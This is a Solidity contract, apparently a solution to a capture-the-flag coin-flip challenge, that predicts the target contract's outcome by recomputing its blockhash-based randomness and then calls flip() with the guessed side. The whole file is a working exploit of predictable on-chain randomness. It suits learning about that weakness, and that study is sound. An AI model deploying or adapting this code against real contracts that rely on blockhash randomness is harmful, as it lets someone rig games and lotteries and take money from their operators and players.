// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./Coinflip.sol";

contract FlipCaller {
    CoinFlip public coinFlip;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFLip) {
        coinFlip = CoinFlip(_coinFLip);
    }

    function callFlip() public {
        bool side = _guessSide();
        coinFlip.flip(side);
    }

    function _guessSide() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 _coinFlip = blockValue / FACTOR;
        bool side = _coinFlip == 1 ? true : false;
        return side;
    }
}
